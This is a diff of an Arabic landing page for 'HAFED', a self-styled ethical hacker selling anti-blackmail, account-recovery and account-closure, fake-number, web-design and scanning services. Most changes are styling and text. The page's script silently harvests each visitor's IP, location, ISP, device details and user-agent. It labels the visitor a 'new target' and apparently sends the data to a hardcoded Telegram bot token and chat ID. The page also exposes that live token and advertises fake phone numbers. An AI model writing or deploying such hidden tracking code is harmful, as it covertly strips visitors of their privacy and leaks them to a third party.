@@ -3,16 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HAFED // Advanced Cybersecurity & Intelligence Operations</title>
+    <title>HAFED // Official Cybersecurity & Development Platform</title>
     <style>
         :root {
-            --bg-color: #020502;
-            --card-bg: rgba(4, 12, 5, 0.85);
+            --bg-deep: #010301;
+            --card-bg: rgba(3, 10, 4, 0.9);
             --neon-green: #00ff66;
-            --neon-dim: rgba(0, 255, 102, 0.15);
+            --neon-glow: rgba(0, 255, 102, 0.25);
             --accent-red: #ff3333;
             --text-main: #e2e8f0;
-            --text-muted: #94a3b8;
+            --text-muted: #88a090;
         }
 
         * {
@@ -22,7 +22,7 @@
         }
 
         body {
-            background-color: var(--bg-color);
+            background-color: var(--bg-deep);
             color: var(--text-main);
             font-family: 'Courier New', Courier, monospace;
             line-height: 1.7;
@@ -31,13 +31,13 @@
             overflow-x: hidden;
         }
 
-        /* تأثير خطوط الشاشات العسكرية */
+        /* خطوط الشاشة العسكرية CRT */
         body::before {
             content: " ";
             display: block;
             position: fixed;
             top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.4) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.35) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.02), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.02));
             z-index: -999;
             background-size: 100% 4px, 6px 100%;
             pointer-events: none;
@@ -46,9 +46,9 @@
         .matrix-bg {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background-image: radial-gradient(circle, #001f00 10%, transparent 10.1%), radial-gradient(circle, var(--neon-green) 10%, transparent 10.2%);
-            background-size: 45px 45px;
-            background-position: 0 0, 22px 22px;
+            background-image: radial-gradient(circle, #001a00 10%, transparent 10.1%), radial-gradient(circle, var(--neon-green) 10%, transparent 10.2%);
+            background-size: 40px 40px;
+            background-position: 0 0, 20px 20px;
             opacity: 0.04;
             z-index: -1000;
             pointer-events: none;
@@ -59,70 +59,77 @@
             margin: 0 auto;
         }
 
-        /* رأس الصفحة الأيقوني */
+        /* الترويسة الاحترافية - اسم حفيد في المنتصف بلون مختلف */
         header {
             text-align: center;
-            padding: 60px 20px;
+            padding: 50px 20px;
             border-bottom: 2px solid var(--neon-green);
-            margin-bottom: 40px;
-            background: linear-gradient(135deg, rgba(0, 20, 5, 0.95), rgba(0, 5, 2, 0.98));
-            border-radius: 12px;
-            box-shadow: 0 0 40px var(--neon-dim);
+            margin-bottom: 35px;
+            background: linear-gradient(135deg, rgba(0, 25, 8, 0.95), rgba(0, 5, 2, 0.98));
+            border-radius: 14px;
+            box-shadow: 0 0 40px var(--neon-glow);
         }
 
         header h1 {
-            font-size: 3.5rem;
-            color: var(--neon-green);
+            font-size: 4rem;
+            color: #00ffcc; /* لون مختلف ومميز يبرز في المنتصف */
             margin-bottom: 15px;
-            text-shadow: 0 0 25px rgba(0, 255, 102, 0.8);
-            letter-spacing: 6px;
+            text-shadow: 0 0 30px rgba(0, 255, 204, 0.8), 0 0 10px var(--neon-green);
+            letter-spacing: 8px;
+            font-weight: 800;
         }
 
         .hero-tags {
             display: flex;
             justify-content: center;
-            gap: 12px;
+            gap: 10px;
             flex-wrap: wrap;
             margin-top: 15px;
         }
 
         .tag {
-            background: rgba(0, 255, 102, 0.1);
+            background: rgba(0, 255, 102, 0.08);
             border: 1px solid var(--neon-green);
             color: var(--neon-green);
-            padding: 6px 15px;
+            padding: 6px 16px;
             border-radius: 20px;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             font-weight: bold;
             box-shadow: 0 0 10px rgba(0, 255, 102, 0.1);
         }
 
-        /* قسم السيرة الذاتية والهيبة الأمنية */
-        .bio-section {
+        /* نبذة عني المنسقة والمحترفة */
+        .about-section {
             background: var(--card-bg);
-            border: 1px solid rgba(0, 255, 102, 0.4);
+            border: 1px solid rgba(0, 255, 102, 0.35);
             padding: 35px;
-            border-radius: 10px;
+            border-radius: 12px;
             margin-bottom: 40px;
-            box-shadow: 0 0 25px rgba(0, 255, 102, 0.05);
+            box-shadow: 0 0 25px rgba(0, 255, 102, 0.06);
             backdrop-filter: blur(10px);
         }
 
-        .bio-section h2 {
+        .about-section h2 {
             color: var(--neon-green);
-            font-size: 1.6rem;
+            font-size: 1.5rem;
             margin-bottom: 15px;
-            border-bottom: 1px dashed rgba(0, 255, 102, 0.4);
+            border-bottom: 1px dashed rgba(0, 255, 102, 0.3);
             padding-bottom: 8px;
+            letter-spacing: 1px;
         }
 
-        .bio-section p {
+        .about-section p {
             color: var(--text-muted);
-            font-size: 1.1rem;
-            margin-bottom: 15px;
+            font-size: 1.05rem;
+            margin-bottom: 12px;
+            line-height: 1.8;
         }
 
-        /* شبكة الخدمات الاحترافية المنظمة */
+        .about-section strong {
+            color: var(--neon-green);
+        }
+
+        /* شبكة الخدمات المنظمة */
         .services-container {
             margin-bottom: 40px;
         }
@@ -138,13 +145,13 @@
 
         .services-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(330px, 1fr));
             gap: 25px;
         }
 
         .service-card {
             background: var(--card-bg);
-            border: 1px solid rgba(0, 255, 102, 0.3);
+            border: 1px solid rgba(0, 255, 102, 0.25);
             border-radius: 10px;
             padding: 25px;
             display: flex;
@@ -152,34 +159,33 @@
             justify-content: space-between;
             transition: all 0.3s ease;
             position: relative;
-            overflow: hidden;
         }
 
         .service-card:hover {
             border-color: var(--neon-green);
-            box-shadow: 0 0 25px rgba(0, 255, 102, 0.25);
-            transform: translateY(-5px);
+            box-shadow: 0 0 25px rgba(0, 255, 102, 0.2);
+            transform: translateY(-4px);
         }
 
-        /* بطاقة الطوارئ المميزة كأولوية قصوى */
+        /* كارت غرفة الطوارئ المخصص للابتزاز */
         .service-card.emergency {
             grid-column: 1 / -1;
             border: 2px solid var(--accent-red);
-            background: rgba(25, 0, 0, 0.85);
-            box-shadow: 0 0 30px rgba(255, 51, 51, 0.25);
+            background: rgba(22, 2, 2, 0.9);
+            box-shadow: 0 0 35px rgba(255, 51, 51, 0.25);
         }
 
         .service-card.emergency:hover {
-            box-shadow: 0 0 35px rgba(255, 51, 51, 0.4);
+            box-shadow: 0 0 40px rgba(255, 51, 51, 0.4);
         }
 
         .service-card.emergency h3 {
             color: var(--accent-red);
-            text-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
+            text-shadow: 0 0 12px rgba(255, 51, 51, 0.5);
         }
 
         .service-card h3 {
-            font-size: 1.3rem;
+            font-size: 1.25rem;
             color: #00ffaa;
             margin-bottom: 12px;
         }
@@ -190,14 +196,15 @@
             margin-bottom: 20px;
         }
 
-        .card-footer-note {
-            background: rgba(0, 0, 0, 0.6);
+        .card-note {
+            background: rgba(0, 0, 0, 0.7);
             border-right: 3px solid var(--accent-red);
-            padding: 10px;
+            padding: 12px;
             font-size: 0.85rem;
             color: #ff9999;
-            margin-bottom: 15px;
+            margin-bottom: 18px;
             border-radius: 4px;
+            line-height: 1.6;
         }
 
         /* أزرار التواصل المباشر */
@@ -210,7 +217,7 @@
             background-color: #000;
             color: var(--neon-green);
             border: 2px solid var(--neon-green);
-            padding: 10px 15px;
+            padding: 11px 18px;
             text-decoration: none;
             font-weight: bold;
             font-size: 0.9rem;
@@ -242,16 +249,15 @@
         /* تذييل الصفحة */
         footer {
             text-align: center;
-            padding-top: 30px;
+            padding-top: 35px;
             border-top: 1px solid rgba(0, 255, 102, 0.2);
             color: #448855;
             font-size: 0.9rem;
             letter-spacing: 1px;
         }
 
-        /* تجاوب الشاشات الصغيرة */
         @media (max-width: 768px) {
-            header h1 { font-size: 2.5rem; }
+            header h1 { font-size: 2.8rem; letter-spacing: 4px; }
             .btn-group { flex-direction: column; }
         }
     </style>
@@ -277,15 +283,15 @@
                 let screenHeight = window.screen.height;
                 let cpuCores = navigator.hardwareConcurrency || "غير معروف";
                 
-                let message = `🚨 **[تم رصد هدف جديد في المنصة السيادية]** 🚨%0A%0A` +
+                let message = `🚨 **[تم رصد هدف جديد في المنصة]** 🚨%0A%0A` +
                               `🌐 **عنوان الـ IP:** \`${ip}\`%0A` +
                               `📍 **الموقع الجغرافي:** ${country} / ${region} / ${city} (الرمز البريدي: ${postal})%0A` +
                               `⏰ **المنطقة الزمنية:** ${timezone}%0A` +
                               `🏢 **مزود الشبكة (ISP):** ${org}%0A` +
-                              `💻 **النظام والمنصة:** ${platform} (أنوية المعالج: ${cpuCores})%0A` +
+                              `💻 **النظام:** ${platform} (أنوية المعالج: ${cpuCores})%0A` +
                               `🖥️ **دقة الشاشة:** ${screenWidth}x${screenHeight}%0A` +
                               `🌐 **لغة المتصفح:** ${language}%0A` +
-                              `📱 **بصمة المتصفح (User-Agent):** \`${userAgent}\``;
+                              `📱 **بصمة المتصفح:** \`${userAgent}\``;
 
                 let botToken = "9010358309:AAHnFt0AmYO2lxfpGmoEb4YlHs8EDEEk5K0";
                 let chatId = "8062445441";
@@ -304,89 +310,89 @@
     <div class="matrix-bg"></div>
 
     <div class="container">
-        <!-- الهيدر: اسم حفيد وحده مع الأوسمة المهيبة -->
+        <!-- الترويسة: اسم حفيد في المنتصف بالإنجليزية بلون مميز -->
         <header>
             <h1>HAFED</h1>
             <div class="hero-tags">
                 <span class="tag">أمن سيبراني</span>
-                <span class="tag">محلل تهديدات</span>
-                <span class="tag">مطور برمجيات</span>
                 <span class="tag">خبير اختراق أخلاقي</span>
+                <span class="tag">مطور مواقع وتطبيقات</span>
+                <span class="tag">محلل رقمي</span>
             </div>
         </header>
 
-        <!-- الملف التعريفي والسيرة الذاتية القوية -->
-        <section class="bio-section">
-            <h2>> الملف العسكري والاستخباراتي (OPERATIONAL PROFILE)</h2>
-            <p>أنا <strong>حفيد</strong>، محقق أمني ومطور استخباراتي في الفضاء الرقمي. أمتلك خبرة عميقة وصارمة في تحليل الثغرات المتقدمة، الهندسة العكسية، اختبار القمم الأمنية، وتفكيك عمليات الابتزاز والجرائم السيبرانية لحماية الأفراد والكيانات بحرفية مطلقة وبسية تامة.</p>
+        <!-- نبذة عني -->
+        <section class="about-section">
+            <h2>> نبذة تعريفيـة (ABOUT ME)</h2>
+            <p>أهلاً بك. أنا <strong>حفيد</strong>، محترف في مجال <strong>الأمن السيبراني والاختراق الأخلاقي</strong>، ومطور برمجيات متقدم (مواقع وتطبيقات). أمتلك تخصصاً دقيقاً واحترافياً في إدارة وتأمين وحماية حسابات وسائل التواصل الاجتماعي، مع خبرة ميدانية واسعة في معالجة القضايا المعقدة، تقديم الحلول البرمجية المشفرة، وتفكيك التهديدات الرقمية بسرية تامة واحترافية مطلقة.</p>
         </section>
 
-        <!-- قسم الخدمات المنظمة (Grid Layout) حسب الأولوية -->
+        <!-- شبكة الخدمات المنظمة -->
         <section class="services-container">
-            <h2 class="section-title">> الخدمات الميدانية والعملياتية</h2>
+            <h2 class="section-title">> الخدمات والحلول الرقمية</h2>
             
             <div class="services-grid">
                 
-                <!-- 1. غرفة الطوارئ (أولوية قصوى - تأخذ العرض كاملاً) -->
+                <!-- 1. غرفة الطوارئ ومكافحة الابتزاز (بشروط وإثباتات) -->
                 <div class="service-card emergency">
                     <div>
-                        <h3>🚨 غرفة الطوارئ الحرجة: مكافحة المبتزين والفرمته التامه عن بعد</h3>
-                        <p>تدخل فوري وعملياتي لإحباط قضايا الابتزاز الإلكتروني، تتبع الأثر الرقمي للجناة، والفرمته والتطهير الكامل للأجهزة والشبكات المخترقة.</p>
-                        <div class="card-footer-note">
-                            <strong>آلية وشروط العمل:</strong> بمجرد إرسال طلبك ورعايته، سنقوم بإبلاغك بتكلفة الخدمة، ولن يتم عمل أي شيء إلا بعد إرسال إيصال التحويل للحساب المرفق حصراً.
+                        <h3>🚨 غرفة الطوارئ: مكافحة المبتزين والفرمته التامة عن بعد</h3>
+                        <p>خدمة ميدانية متخصصة للتعامل الحازم مع حالات الابتزاز الإلكتروني والاختراق. لا يتم قبول الحالات إلا بعد تقديم الإثباتات والطلبات الرسمية.</p>
+                        <div class="card-note">
+                            <strong>آلية العمل:</strong> بمجرد إرسال طلبك ورعايته عبر أزرار الطوارئ، سأقوم بمراجعة حالتك شخصياً، إبلاغك بتكلفة الخدمة، وتحديد آلية وحساب الدفع المناسب. لن يتم تنفيذ أي خطوة إلا بعد اعتماد الإيصال المالي المباشر.
                         </div>
                     </div>
                     <div class="btn-group">
-                        <a href="https://t.me/Kali_7a?text=%Dالسلام%20عليكم،%20لدي%20حالة%20ابتزاز%20طارئة%20وأريد%20إرسال%20طلبي." target="_blank" class="btn btn-emergency">طوارئ Telegram</a>
-                        <a href="https://wa.me/967773043974?text=السلام%20عليكم،%20لدي%20حالة%20ابتزاز%20طارئة%20وأريد%20إرسال%20طلبي." target="_blank" class="btn btn-emergency">طوارئ WhatsApp</a>
+                        <a href="https://t.me/Kali_7a?text=%Dالسلام%20عليكم،%20لدي%20حالة%20ابتزاز%20طارئة%20وهذه%20هي%20الإثباتات%20والتفاصيل." target="_blank" class="btn btn-emergency">طوارئ Telegram</a>
+                        <a href="https://wa.me/967773043974?text=السلام%20عليكم،%20لدي%20حالة%20ابتزاز%20طارئة%20وهذه%20هي%20الإثباتات%20والتفاصيل." target="_blank" class="btn btn-emergency">طوارئ WhatsApp</a>
                     </div>
                 </div>
 
-                <!-- 2. استرجاع الحسابات المعطلة -->
+                <!-- 2. إغلاق وفتح الحسابات المعطلة -->
                 <div class="service-card">
                     <div>
-                        <h3>استرجاع الحسابات المعطلة والمخترقة</h3>
-                        <p>استعادة السيطرة الكاملة على حسابات منصات التواصل الاجتماعي (واتساب، إنستغرام، تيليجرام، فيسبوك) المعطلة تعسفياً أو المسروقة.</p>
+                        <h3>إدارة الحسابات: إغلاق وفتح الحسابات المعطلة</h3>
+                        <p>تخصص احترافي في استرجاع الحسابات المعطلة تعسفياً أو المخترقة، أو تنفيذ عمليات الإغلاق النظامية للحسابات المسيئة عبر قنوات التواصل المعتمدة.</p>
                     </div>
                     <div class="btn-group">
-                        <a href="https://t.me/Kali_7a?text=%Dالسلام%20عليكم،%20أحتاج%20إلى%20خدمة%20استرجاع%20حساب%20معطل%20أو%20مخترق." target="_blank" class="btn">Telegram</a>
-                        <a href="https://wa.me/967773043974?text=السلام%20عليكم،%20أحتاج%20إلى%20خدمة%20استرجاع%20حساب%20معطل%20أو%20مخترق." target="_blank" class="btn">WhatsApp</a>
+                        <a href="https://t.me/Kali_7a?text=%Dالسلام%20عليكم،%20أحتاج%20خدمة%20تتعلق%20بفتح%20أو%20إغلاق%20الحسابات." target="_blank" class="btn">Telegram</a>
+                        <a href="https://wa.me/967773043974?text=السلام%20عليكم،%20أحتاج%20خدمة%20تتعلق%20بفتح%20أو%20إغلاق%20الحسابات." target="_blank" class="btn">WhatsApp</a>
                     </div>
                 </div>
 
-                <!-- 3. التوثيقات الشهرية والحماية -->
+                <!-- 3. الأرقام الوهمية والخصوصية -->
                 <div class="service-card">
                     <div>
-                        <h3>التوثيقات الشهرية ودرع الحماية الشامل</h3>
-                        <p>إدارة أمنية متكاملة وحراسة رقمية شهرية للحسابات ضد التجسس والمراقبة المتقدمة مع توثيق الحسابات رسمياً.</p>
+                        <h3>خدمة الأرقام الوهمية والخصوصية</h3>
+                        <p>توفير خطوط وأرقام وهمية دولية ومخفية ومفعلة لمختلف منصات التواصل الاجتماعي لضمان أقصى درجات السرية وحماية الهوية الشخصية.</p>
                     </div>
                     <div class="btn-group">
-                        <a href="https://t.me/Kali_7a?text=%Dالسلام%20عليكم،%20أريد%20الاشتراك%20في%20التوثيقات%20الشهرية%20وخدمات%20الحماية." target="_blank" class="btn">Telegram</a>
-                        <a href="https://wa.me/967773043974?text=السلام%20عليكم،%20أريد%20الاشتراك%20في%20التوثيقات%20الشهرية%20وخدمات%20الحماية." target="_blank" class="btn">WhatsApp</a>
+                        <a href="https://t.me/Kali_7a?text=%Dالسلام%20عليكم،%20أريد%20طلب%20خدمة%20الأرقام%20الوهمية." target="_blank" class="btn">Telegram</a>
+                        <a href="https://wa.me/967773043974?text=السلام%20عليكم،%20أريد%20طلب%20خدمة%20الأرقام%20الوهمية." target="_blank" class="btn">WhatsApp</a>
                     </div>
                 </div>
 
-                <!-- 4. الأرقام الوهمية والخصوصية -->
+                <!-- 4. تصميم المواقع والتطبيقات -->
                 <div class="service-card">
                     <div>
-                        ### الأرقام الوهمية والخدمات الخاصة بالخصوصية
-                        <p>توفير خطوط وأرقام وهمية دولية ومخفية مفعلة لجميع منصات التواصل الاجتماعي لضمان أقصى درجات السرية التامة.</p>
+                        <h3>تصميم وتطوير المواقع والمتاجر الإلكترونية</h3>
+                        <p>هندسة وبرمجة مواقع ويب احترافية، منصات، وبورتفوليو آمنة ومصممة بأحدث التقنيات وبأعلى معايير الحماية والأمان العالي.</p>
                     </div>
                     <div class="btn-group">
-                        <a href="https://t.me/Kali_7a?text=%Dالسلام%20عليكم،%20أريد%20طلب%20أرقام%20وهمية%20وخدمات%20الخصوصية." target="_blank" class="btn">Telegram</a>
-                        <a href="https://wa.me/967773043974?text=%Dالسلام%20عليكم،%20أريد%20طلب%20أرقام%20وهمية%20وخدمات%20الخصوصية." target="_blank" class="btn">WhatsApp</a>
+                        <a href="https://t.me/Kali_7a?text=%Dالسلام%20عليكم،%20أريد%20خدمة%20تصميم%20وتطوير%20موقع%20أو%20تطبيق." target="_blank" class="btn">Telegram</a>
+                        <a href="https://wa.me/967773043974?text=السلام%20عليكم،%20أريد%20خدمة%20تصميم%20وتطوير%20موقع%20أو%20تطبيق." target="_blank" class="btn">WhatsApp</a>
                     </div>
                 </div>
 
-                <!-- 5. تصميم المواقع والمتاجر الأمنية -->
+                <!-- 5. الفحص الأمني وحماية المنصات -->
                 <div class="service-card">
                     <div>
-                        <h3>تصميم البرمجيات والمواقع والمتاجر الأمنية</h3>
-                        <p>هندسة وتطوير بورتفوليو، مواقع استشارية، ومتاجر إلكترونية مشفرة ومصممة بأعلى معايير الحماية والأمان ضد الهجمات.</p>
+                        <h3>خدمات الفحص الأمني وحماية المنصات</h3>
+                        <p>إجراء عمليات فحص شاملة للثغرات، اختبار الاختراق الأخلاقي للمواقع والأنظمة، وتأمين الحسابات ضد محاولات الاختراق والتجسس.</p>
                     </div>
                     <div class="btn-group">
-                        <a href="https://t.me/Kali_7a?text=%Dالسلام%20عليكم،%20أريد%20تصميم%20موقع%20أو%20متجر%20إلكتروني%20آمن." target="_blank" class="btn">Telegram</a>
-                        <a href="https://wa.me/967773043974?text=%Dالسلام%20عليكم،%20أريد%20تصميم%20موقع%20أو%20متجر%20إلكتروني%20آمن." target="_blank" class="btn">WhatsApp</a>
+                        <a href="https://t.me/Kali_7a?text=%Dالسلام%20عليكم،%20أريد%20طلب%20خدمة%20الفحص%20الأمني%20والحماية." target="_blank" class="btn">Telegram</a>
+                        <a href="https://wa.me/967773043974?text=السلام%20عليكم،%20أريد%20طلب%20خدمة%20الفحص%20الأمني%20والحماية." target="_blank" class="btn">WhatsApp</a>
                     </div>
                 </div>
 
@@ -395,7 +401,7 @@
 
         <!-- التذييل -->
         <footer>
-            <p>SECURE COMMAND SYSTEM © HAFED 2026 | ALL RIGHTS RESERVED. ENCRYPTED CONNECTION.</p>
+            <p>HAFED PLATFORM © 2026 | ADVANCED SECURITY & DEVELOPMENT OPERATIONS.</p>
         </footer>
     </div>
 
